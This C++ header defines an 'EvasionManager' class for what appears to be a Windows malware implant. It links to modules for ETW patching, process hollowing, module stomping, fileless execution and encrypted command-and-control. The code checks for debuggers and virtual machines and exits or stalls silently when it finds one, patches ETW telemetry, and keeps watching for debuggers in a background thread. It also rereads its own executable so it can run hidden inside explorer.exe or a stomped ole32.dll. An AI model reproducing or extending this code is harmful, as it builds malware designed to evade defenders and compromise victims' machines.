#pragma once

#ifdef _WIN32
#include <Windows.h>
#include <string>
#include <vector>
#include <cstdint>
#include <thread>
#include <chrono>

#include "domain/common/AntiAnalysis.hpp"
#include "domain/common/EtwPatch.hpp"
#include "domain/common/ProcessHollowing.hpp"
#include "domain/common/ModuleStomping.hpp"
#include "domain/common/FilelessExec.hpp"
#include "domain/common/EncryptedC2.hpp"

namespace nuub::domain {

class EvasionManager {
    bool stealth_mode_ = false;
    bool anti_debug_enabled_ = true;
    bool anti_vm_enabled_ = false;
    bool etw_patch_enabled_ = true;
    bool process_hollowing_enabled_ = false;

public:
    struct Config {
        bool stealth_mode = false;
        bool anti_debug = true;
        bool anti_vm = false;
        bool etw_patch = true;
        bool process_hollowing = false;
        bool module_stomping = false;
        std::string target_process = "explorer.exe";
    };

    static EvasionManager& instance() {
        static EvasionManager inst;
        return inst;
    }

    void configure(const Config& cfg) {
        stealth_mode_ = cfg.stealth_mode;
        anti_debug_enabled_ = cfg.anti_debug;
        anti_vm_enabled_ = cfg.anti_vm;
        etw_patch_enabled_ = cfg.etw_patch;
        process_hollowing_enabled_ = cfg.process_hollowing;
    }

    // Initialize all evasion techniques
    void initialize() {
        // 1. Anti-debug checks
        if (anti_debug_enabled_) {
            if (anti::AntiDebug::should_terminate()) {
                // In stealth mode, just sleep forever instead of exiting
                if (stealth_mode_) {
                    while (true) {
                        Sleep(10000);
                    }
                }
                // Exit silently
                ExitProcess(0);
            }
        }

        // 2. Anti-VM checks
        if (anti_vm_enabled_) {
            if (anti::AntiVM::is_virtual_machine()) {
                if (stealth_mode_) {
                    while (true) {
                        Sleep(10000);
                    }
                }
                ExitProcess(0);
            }
        }

        // 3. Patch ETW
        if (etw_patch_enabled_) {
            EtwPatch::patch_all();
        }

        // 4. Start anti-debug monitoring thread
        if (anti_debug_enabled_) {
            std::thread([]() {
                while (true) {
                    Sleep(5000);
                    if (anti::AntiDebug::should_terminate()) {
                        ExitProcess(0);
                    }
                }
            }).detach();
        }
    }

    // Execute via process hollowing (stealth)
    bool execute_stealth(const std::wstring& target_process) {
        // Read our own executable
        wchar_t exe_path[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

        HANDLE hFile = CreateFileW(exe_path, GENERIC_READ, FILE_SHARE_READ,
                                   nullptr, OPEN_EXISTING, 0, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) return false;

        DWORD file_size = GetFileSize(hFile, nullptr);
        std::vector<uint8_t> exe_data(file_size);

        DWORD bytes_read = 0;
        ReadFile(hFile, exe_data.data(), file_size, &bytes_read, nullptr);
        CloseHandle(hFile);

        if (bytes_read != file_size) return false;

        return ProcessHollowing::hollow_and_run(target_process, exe_data);
    }

    // Execute via module stomping
    bool execute_module_stompe() {
        wchar_t exe_path[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

        HANDLE hFile = CreateFileW(exe_path, GENERIC_READ, FILE_SHARE_READ,
                                   nullptr, OPEN_EXISTING, 0, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) return false;

        DWORD file_size = GetFileSize(hFile, nullptr);
        std::vector<uint8_t> exe_data(file_size);

        DWORD bytes_read = 0;
        ReadFile(hFile, exe_data.data(), file_size, &bytes_read, nullptr);
        CloseHandle(hFile);

        if (bytes_read != file_size) return false;

        return ModuleStomping::stompe_and_run(
            L"ole32.dll", exe_data.data(), exe_data.size());
    }

    // Get stealth status
    bool is_stealth_mode() const { return stealth_mode_; }
    bool is_anti_debug_enabled() const { return anti_debug_enabled_; }
    bool is_etw_patched() const { return etw_patch_enabled_; }
};

} // namespace nuub::domain
#endif
